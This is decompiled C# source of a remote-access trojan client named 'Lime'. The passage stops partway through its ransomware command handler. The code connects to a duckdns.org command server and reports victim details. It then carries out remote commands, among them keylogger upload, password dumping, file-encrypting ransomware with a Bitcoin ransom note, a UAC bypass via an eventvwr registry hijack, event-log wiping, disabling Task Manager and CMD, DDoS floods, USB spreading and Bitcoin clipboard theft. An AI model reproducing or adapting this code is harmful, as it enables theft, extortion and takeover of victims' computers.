using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

namespace Lime;

[StandardModule]
internal sealed class Core
{
	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	public static string BTC_ADD = "";

	public static bool BTC_EN = Conversions.ToBoolean("False");

	public static string SLP = "0";

	public static string TMOT = "1";

	private static byte[] b = new byte[5121];

	public static bool BD = Conversions.ToBoolean("False");

	public static TcpClient C = null;

	public static bool Cn = false;

	public static string DR = "TEMP";

	public static string EXE = "Client.exe";

	public static Computer F = new Computer();

	public static FileStream FS;

	public static string H = "windowsportabledevicesprivacy.duckdns.org";

	public static bool Idr = Conversions.ToBoolean("False");

	public static bool Anti_CH = Conversions.ToBoolean("False");

	public static bool IsF = Conversions.ToBoolean("False");

	public static bool USB_SP = Conversions.ToBoolean("False");

	public static bool Isu = Conversions.ToBoolean("False");

	public static kl kq = null;

	private static string lastcap = "";

	public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly()!.Location);

	private static MemoryStream MeM = new MemoryStream();

	public static object MT = null;

	public static string P = "9851";

	public static object PLG = null;

	public static string RG = "Client.exe";

	public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static string VN = "YWJyLzEy";

	public static string VR = "0.7.3";

	public static string Y = "ultimate";

	public static bool BOT_KILL = Conversions.ToBoolean("False");

	public static bool HIDE_ME = Conversions.ToBoolean("False");

	public static bool Persis = Conversions.ToBoolean("False");

	[CompilerGenerated]
	[DebuggerStepThrough]
	private static void _Lambda__1(object a0)
	{
		Ind((byte[])a0);
	}

	[DebuggerStepThrough]
	[CompilerGenerated]
	private static void _Lambda__2(object sender, SessionEndingEventArgs e)
	{
		ED();
	}

	public static string BS(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo == null)
						{
							return false;
						}
						continue;
					}
					return true;
				}
				return false;
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	public static bool connect()
	{
		Cn = false;
		Thread.Sleep(2000);
		FileInfo lO = LO;
		lock (lO)
		{
			try
			{
				if (C != null)
				{
					try
					{
						C.Close();
						C = null;
						Thread.Sleep(checked((int)Math.Round(Math.Round(Math.Round(Conversions.ToDouble(TMOT) * 1000.0)))));
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MeM.Dispose();
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2);
					Exception projectError2 = ex2;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception projectError3 = ex3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				MeM = new MemoryStream();
				C = new TcpClient();
				C.ReceiveBufferSize = 204800;
				C.SendBufferSize = 204800;
				C.Client.SendTimeout = 10000;
				C.Client.ReceiveTimeout = 10000;
				C.Connect(H, Conversions.ToInteger(P));
				Cn = true;
				Send(inf());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
					{
						text = text + DEB(ref VN) + "\r\n";
					}
					else
					{
						string text2 = text;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
						text = text2 + DEB(ref s) + "\r\n";
					}
					text = text + H + ":" + P + "\r\n" + DR + "\r\n" + EXE + "\r\n" + Conversions.ToString(Idr) + "\r\n" + Conversions.ToString(IsF) + "\r\n" + Conversions.ToString(Isu) + "\r\n" + Conversions.ToString(BD);
					Send("inf" + Y + ENB(ref text));
				}
				catch (Exception ex4)
				{
					ProjectData.SetProjectError(ex4);
					Exception projectError4 = ex4;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				Cn = false;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		return Cn;
	}

	public static string DEB(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BS(ref B);
	}

	public static void DLV(string n)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG, writable: true)!.DeleteValue(n);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void ED()
	{
		pr(0);
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(SB(ref s));
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string ACT()
	{
		string result;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref WinTitle, WinTitle.Length);
			result = ENB(ref WinTitle);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string GetWallet()
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		checked
		{
			string text;
			do
			{
				string processName = processes[num].ProcessName;
				text = ((Operators.CompareString(processName, "bitcoin-qt", false) == 0) ? "BitcoinCore" : ((Operators.CompareString(processName, "Bitcoin.com.exe", false) == 0) ? "Bitcoin.com Wallet" : ((!processName.Contains("electrum")) ? "Not Found" : "Electrum")));
				_ = processes[num].Id;
				num++;
			}
			while (!((Operators.CompareString(text, "Not Found", false) != 0) | (num > processes.Length - 1)));
			if (num > processes.Length - 1)
			{
				text = "Not Found";
			}
			return text;
		}
	}

	public static string GETav()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			return text.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "AntiVirus: N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static object GTV(string n, object ret)
	{
		object objectValue;
		try
		{
			objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG)!.GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			objectValue = RuntimeHelpers.GetObjectValue(ret);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return objectValue;
	}

	public static string HWD()
	{
		string result;
		try
		{
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			result = Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string GetCPU()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		try
		{
			ManagementObject val = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
			val.Get();
			return ((ManagementBaseObject)val).get_Item("Name").ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetVideoCard()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val3).get_Item("Name")), (object)". "));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Ind(byte[] b)
	{
		//IL_074e: Unknown result type (might be due to invalid IL or missing references)
		//IL_087b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccf: Expected O, but got Unknown
		//IL_1b7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b82: Expected O, but got Unknown
		//IL_1c0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c14: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				byte[] bytes = default(byte[]);
				switch (text)
				{
				case "RwareBG":
				{
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream = new MemoryStream();
							int length = (array[0] + Y + array[1] + Y).Length;
							memoryStream.Write(b, length, b.Length - length);
							bytes = ZIP(memoryStream.ToArray());
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception projectError9 = ex;
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					string lpvParam = Path.GetTempFileName() + "." + array[1];
					while (!File.Exists(Path.GetTempPath() + "done.LE"))
					{
						Application.DoEvents();
					}
					try
					{
						File.WriteAllBytes(lpvParam, bytes);
						RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Control Panel\\Desktop", writable: true);
						registryKey.SetValue("WallpaperStyle", "2");
						registryKey.SetValue("TileWallpaper", "0");
						SystemParametersInfoA(20, 0, ref lpvParam, 1);
						return;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError10 = ex2;
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				case "delchrm":
				{
					string text3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
					if (!Directory.Exists(text3))
					{
						break;
					}
					try
					{
						Process[] processesByName2 = Process.GetProcessesByName("chrome");
						Process[] array11 = processesByName2;
						foreach (Process process2 in array11)
						{
							process2.Kill();
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						Send("MSG" + Y + "Delete Cookies: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					try
					{
						Thread.Sleep(200);
						File.Delete(text3 + "\\User Data\\Default\\Login Data");
						File.Delete(text3 + "\\User Data\\Default\\Cookies");
						Send("MSG" + Y + "Chrome cookies and login deleted successfully!");
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						Send("MSG" + Y + "Chrome is not installed!");
						ProjectData.ClearProjectError();
					}
					break;
				}
				case "OpenWebpageHidden":
					try
					{
						HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[1]);
						_ = (HttpWebResponse)httpWebRequest.GetResponse();
						httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
						httpWebRequest.AllowAutoRedirect = true;
						httpWebRequest.Timeout = 10000;
						httpWebRequest.Method = "GET";
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "MonitorOFF":
					SendMessage(-1, 274u, 61808u, 2);
					break;
				case "TextToSpeech":
					try
					{
						object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", "")));
						object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
						Type type = null;
						string text2 = "speak";
						object[] array2 = new object[1];
						object[] array3 = array2;
						string[] array4 = array;
						string[] array5 = array4;
						int num = 1;
						array3[0] = array5[1];
						object[] array6 = array2;
						object[] array7 = array6;
						string[] array8 = null;
						Type[] array9 = null;
						bool[] array10 = new bool[1] { true };
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), type, text2, array7, array8, array9, array10, true);
						if (array10[0])
						{
							array4[num] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(string)));
						}
						Send("MSG" + Y + "Speech sent!");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				case "RwareDEC":
				{
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (!File.Exists(folderPath2 + "\\Microsoft\\MMC\\hash"))
					{
						Send("MSG" + Y + "Ransomware: The client is not encrypted");
						return;
					}
					RwareDE rwareDE = new RwareDE();
					rwareDE.Decrypt_File();
					Environment.GetFolderPath(Environment.SpecialFolder.Startup);
					Process[] processesByName = Process.GetProcessesByName("notepad");
					foreach (Process process in processesByName)
					{
						process.Kill();
					}
					break;
				}
				case "NormalMouse":
					SwapMouseButton(0L);
					break;
				case "taskmgrON":
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
						Send("MSG" + Y + "TaskManager: Enabled");
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						Send("MSG" + Y + "TaskManager: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					break;
				case "ChngWLL":
				{
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream3 = new MemoryStream();
							int length3 = (array[0] + Y + array[1] + Y).Length;
							memoryStream3.Write(b, length3, b.Length - length3);
							bytes = ZIP(memoryStream3.ToArray());
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5);
							Exception projectError20 = ex5;
							ProjectData.SetProjectError(projectError20);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					string lpvParam2 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(lpvParam2, bytes);
						RegistryKey registryKey3 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Control Panel\\Desktop", writable: true);
						registryKey3.SetValue("WallpaperStyle", "2");
						registryKey3.SetValue("TileWallpaper", "0");
						SystemParametersInfoA(20, 0, ref lpvParam2, 1);
						Send("MSG" + Y + "Wallpaper changed");
						return;
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6);
						Exception projectError21 = ex6;
						ProjectData.SetProjectError(projectError21);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				case "kl":
					Send("kl" + Y + ENB(ref kq.Logs));
					return;
				case "msgbox":
					MessageBox.Show(array[1], "", (MessageBoxButtons)0, (MessageBoxIcon)0, (MessageBoxDefaultButton)0, (MessageBoxOptions)2097152, false);
					break;
				case "seed":
					Torrent.SeedTorrent(array[1]);
					break;
				case "ddos.slowloris.start":
					Slowloris.StartSlowloris(array[1], 10, 21600, "");
					break;
				case "ll":
					Cn = false;
					return;
				case "SL":
					try
					{
						if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat"))
						{
							File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat");
						}
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\STSL.dat");
						LimeSL limeSL = new LimeSL();
						((Form)limeSL).ShowDialog();
						Send("MSG" + Y + "Screen Locker: Locked!");
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
					break;
				case "SLU":
					try
					{
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat");
						Thread.Sleep(10);
						File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\STSL.dat");
						Send("MSG" + Y + "Screen Locker: Unlocked!");
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "RwareSU":
					while (!File.Exists(Path.GetTempPath() + "done.LE"))
					{
						Application.DoEvents();
					}
					Environment.GetFolderPath(Environment.SpecialFolder.Startup);
					if (BTC_EN)
					{
						Process[] processesByName3 = Process.GetProcessesByName("notepad");
						foreach (Process process3 in processesByName3)
						{
							process3.Kill();
						}
						string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
						string text5 = folderPath3 + "\\Ransomware.txt";
						if (File.Exists(text5))
						{
							File.Delete(text5);
						}
						using (StreamWriter streamWriter = new StreamWriter(text5, append: true))
						{
							streamWriter.WriteLine("All your files have been locked");
							streamWriter.WriteLine("");
							streamWriter.WriteLine("You can get them back, Just pay us " + array[1] + " as Bitcoin");
							streamWriter.WriteLine("");
							streamWriter.WriteLine("Our bitcoin address is");
							streamWriter.WriteLine("");
							streamWriter.WriteLine(BTC_ADD);
							streamWriter.WriteLine("");
							streamWriter.WriteLine("Watch this video to learn how to pay us https://www.youtube.com/watch?v=Ji9IwPId5Uk");
							streamWriter.WriteLine("");
							streamWriter.WriteLine("This is not a joke. This is a ransomware");
						}
						Process.Start(text5);
					}
					else
					{
						Send("MSG" + Y + "Ransomware: Couldn't send address. The stub has no BTC address");
					}
					break;
				case "restartme":
					Interaction.Shell("shutdown -r -t 00 -f", (AppWinStyle)0, false, -1);
					break;
				case "GiveMeAdmin":
				{
					object current = WindowsIdentity.GetCurrent();
					object obj = new WindowsPrincipal((WindowsIdentity)current);
					if (Conversions.ToBoolean(NewLateBinding.LateGet(obj, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						Send("MSG" + Y + "Already running as administrator!");
						break;
					}
					pr(0);
					using (RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\mscfile\\shell\\open\\command"))
					{
						registryKey2.SetValue("", Application.get_ExecutablePath(), RegistryValueKind.String);
					}
					Process.Start("eventvwr.exe");
					ProjectData.EndApp();
					break;
				}
				case "DisableCMD":
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
						Send("MSG" + Y + "CMD: Disabled");
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						Send("MSG" + Y + "DisableCMD: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					break;
				case "taskmgrOFF":
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
						Send("MSG" + Y + "TaskManager: Disabled");
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						Send("MSG" + Y + "TaskManager: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					break;
				case "EventLogs":
					try
					{
						EventLog val = new EventLog();
						EventLog[] eventLogs = EventLog.GetEventLogs();
						for (int k = 0; k < eventLogs.Length; k++)
						{
							val = eventLogs[k];
							val.Clear();
							val.Close();
						}
						Send("MSG" + Y + "Events Logs deleted successfully!");
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						Send("MSG" + Y + "EventLogs: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					break;
				case "HideBar":
					try
					{
						string lpClassName2 = "Shell_traywnd";
						string lpWindowName2 = "";
						int hwnd2 = FindWindowA(ref lpClassName2, ref lpWindowName2);
						SetWindowPos(hwnd2, 0, 0, 0, 0, 0, 128);
						Send("MSG" + Y + "Hidebar");
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
					}
					break;
				case "BitcoinOFF":
					if (!BTC_EN)
					{
						Send("MSG" + Y + "BitcoinGrabber was not checked when stub created!");
						return;
					}
					try
					{
						bitgrb.stopme();
						Interaction.SaveSetting("Lime", "SU", "btc", "0");
						Send("MSG" + Y + "BitcoinGrabber stopped successfully!");
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						Send("MSG" + Y + "BitcoinGrabber is already not running");
						ProjectData.ClearProjectError();
					}
					break;
				case "pass2":
				{
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream2 = new MemoryStream();
							int length2 = (array[0] + Y + array[1] + Y).Length;
							memoryStream2.Write(b, length2, b.Length - length2);
							bytes = ZIP(memoryStream2.ToArray());
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception projectError12 = ex3;
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					string text4 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(text4, bytes);
						Process.Start(text4);
						Thread.Sleep(5000);
						string path = Path.GetTempPath() + "\\dump456\\pwd.txt";
						string s = File.ReadAllText(path);
						Send("pass2" + Y + ENB(ref s));
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4);
						Exception projectError13 = ex4;
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
					break;
				}
				case "ClearClp":
				{
					Thread thread2 = new Thread((ThreadStart)Clipboard.Clear);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					Send("MSG" + Y + "Clipboard cleared successfully!");
					break;
				}
				case "antiprocstop":
					MyAntiProcess.stopme();
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Lime", "anti", (object)"0");
					Send("MSG" + Y + "Anti Process Stopped!");
					break;
				case "shutdownme":
					Interaction.Shell("shutdown -s -t 00 -f", (AppWinStyle)0, false, -1);
					break;
				case "MonitorON":
					SendMessage(-1, 274u, 61808u, -1);
					break;
				case "ReverseMouse":
					SwapMouseButton(256L);
					break;
				case "spreadusbme":
					SPUSB.Enable();
					break;
				case "ddos.ARME.stop":
					ARME.StopARME();
					break;
				case "ddos.slowloris.stop":
					Slowloris.StopSlowloris();
					break;
				case "EnableCMD":
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
						Send("MSG" + Y + "CMD: Enabled");
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						Send("MSG" + Y + "CMD: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					break;
				case "OpenWebpage":
					Process.Start(array[1]);
					break;
				case "ddos.ARME.start":
					ARME.StartARME(array[1], 10, 21600, "");
					break;
				case "SetClp":
				{
					Thread thread = new Thread(delegate(object a0)
					{
						Clipboard.SetText(Conversions.ToString(a0));
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(array[1]);
					Send("MSG" + Y + "Clipboard copied successfully!");
					break;
				}
				case "botk":
					BotKillers.RunStandardBotKiller();
					Send("MSG" + Y + "Malware Killer ran successfully!");
					break;
				case "BitcoinON":
					if (!BTC_EN)
					{
						Send("MSG" + Y + "BitcoinGrabber was not checked when stub created!");
						return;
					}
					bitgrb.Start();
					Interaction.SaveSetting("Lime", "SU", "btc", "1");
					Send("MSG" + Y + "BitcoinGrabber started successfully!");
					break;
				case "Rware":
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
